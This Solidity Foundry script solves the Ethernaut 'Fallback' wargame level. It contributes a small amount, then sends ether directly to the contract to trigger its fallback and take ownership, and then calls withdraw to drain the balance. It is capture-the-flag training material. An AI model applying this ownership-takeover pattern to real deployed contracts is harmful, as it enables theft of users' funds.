// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallback} from "../src/EthernautFallback.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackEthernaut =
        Fallback(payable(0x8a98A397af8059D882065Da1A51D271C3F27Bc20));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackEthernaut.contribute{value: 0.00001 ether}();
        (bool success, ) = address(fallbackEthernaut).call{value: 1 wei}("");
        require(success, "Call failed");
        console.log("New Owner: ", fallbackEthernaut.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        if (fallbackEthernaut.owner() == vm.envAddress("MY_ADDRESS")) {
            fallbackEthernaut.withdraw();
        }

        vm.stopBroadcast();
    }
}
